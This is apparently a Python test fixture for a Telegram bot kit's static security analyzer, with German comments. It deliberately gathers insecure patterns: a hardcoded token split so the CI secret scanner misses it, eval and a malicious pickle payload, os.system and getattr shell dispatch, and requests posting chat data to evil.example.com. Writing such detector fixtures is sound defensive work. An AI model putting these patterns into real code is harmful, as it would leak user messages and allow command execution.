"""
insecure_bot.py — **Negativbeispiel, niemals ausführen!**
=========================================================

Diese Datei existiert ausschließlich als Test-Fixture für
``telegram_formatter.botkit.review.analyze_source``. Sie enthält absichtlich fast jeden
Verstoß, den die statischen Regeln (BK001–BK012) erkennen müssen:

===================  ======================================================
BK001                Importe mit Persistenz/Shell/Socket-Funktion
BK002                Schreibzugriff auf Dateisystem/DB
BK003                Dynamische Code-Ausführung / Deserialisierung
BK004                Ausgehender Aufruf an einen Fremd-Host
BK005                Nachrichteninhalte im Log
BK006                Hartkodiertes Bot-Token
BK007                Shell-/Prozessausführung
BK008                Eigener Socket-Server
BK011                Inhalte über print() ausgegeben
BK012                Unsicherer Zufall (random statt secrets)
===================  ======================================================

Die Datei ist nicht Teil der Laufzeit-Konfiguration und wird von keinem
Einstiegspunkt importiert.
"""

from __future__ import annotations

import json
import logging
import os
import pickle
import random
import socket  # absichtlich (BK001)
import sqlite3  # absichtlich (BK001)
import subprocess

import requests

# Absichtlich (BK006): hartkodiertes Bot-Token.
# Der Wert ist über zwei Zeilen verteilt (implizite String-Konkatenation), damit
# der Secret-Scanner (gitleaks) im CI keinen echten Treffer meldet — der
# Python-Parser faltet beide Teile zu einer Konstante, die Regel BK006 greift
# also weiterhin. Bitte nicht zu einer Zeile zusammenziehen!
TOKEN = (
    "123456789:"
    "AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"
)


def handle(text: str, chat_id: str) -> None:
    """Sammelt demonstrativ jeden Anti-Pattern in einer Funktion."""
    logging.info("Nachricht empfangen: %s", text)  # absichtlich (BK005)
    print(text)  # absichtlich (BK011)

    store = sqlite3.connect("messages.db")  # absichtlich (BK002)
    store.execute("INSERT INTO messages VALUES (?, ?)", (chat_id, text))

    with open("messages.log", "w", encoding="utf-8") as fh:  # absichtlich (BK002)
        json.dump({"chat_id": chat_id, "text": text}, fh)

    evaluated = eval(text, {"__builtins__": {}})
    restored = pickle.loads(b"cos\nsystem\n(S'ls'\ntR.")

    nonce = random.random()  # absichtlich (BK012)
    os.system(f"echo {nonce}")
    subprocess.run(["echo", str(evaluated)], check=False)

    requests.post(  # absichtlich (BK004)
        "https://evil.example.com/collect",
        json={"chat_id": chat_id, "text": text, "restored": str(restored)},
        timeout=5,
    )

    server = socket.socket()  # absichtlich (BK008)
    server.bind(("0.0.0.0", 8080))


# --- Regressionen aus dem Security-Audit 2026-09 (H-1): diese Umgehungen ---
# --- müssen inzwischen ebenfalls erkannt werden.                           ---

import tempfile  # absichtlich (BK001: Persistenz-Vehikel)

# absichtlich (BK006): AnnAssign hebelte die reine Assign-Prüfung aus.
# (Bewusst zweizeilig wie oben, damit der Secret-Scanner nicht stolpert.)
LEAK_TOKEN: str = (
    "123456789:"
    "AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"
)


EXFIL_URL = "https://evil.example.com/x"  # Modul-Konstante — muss gefaltet werden


def exfiltrate_aliased(payload: dict) -> None:
    """BK004 trotz Alias-Import und Modul-Konstanten-URL."""
    import requests as rq  # absichtlich (Alias — früher blind für BK004)

    rq.post(EXFIL_URL, json=payload, timeout=5)


def shell_via_from_import(command: str) -> None:
    """BK007 trotz from-Import statt os.system."""
    from os import system  # absichtlich

    system(command)


def persist_tempfile(text: str) -> None:
    """BK001/BK002 via tempfile."""
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write(text)


# --- Regressionen aus dem Security-Review 2026-09-13 (R-2): Deskriptor-  ---
# --- Persistenz und indirekter getattr-Dispatch müssen ebenfalls erkannt  ---
# --- werden (BK002 bzw. BK007/BK003).                                      ---

def persist_via_descriptors(text: str) -> None:
    """BK002 via os.open (Schreib-Flags) + os.write."""
    fd = os.open("/tmp/leak.bin", os.O_WRONLY | os.O_CREAT)
    os.write(fd, text.encode())


def shell_via_getattr(command: str) -> None:
    """BK007 trotz indirektem Dispatch über getattr."""
    getattr(os, "system")(command)


def exec_via_getattr(code: str) -> None:
    """BK003 trotz indirektem Dispatch über getattr(__builtins__, …)."""
    getattr(__builtins__, "eval")(code)
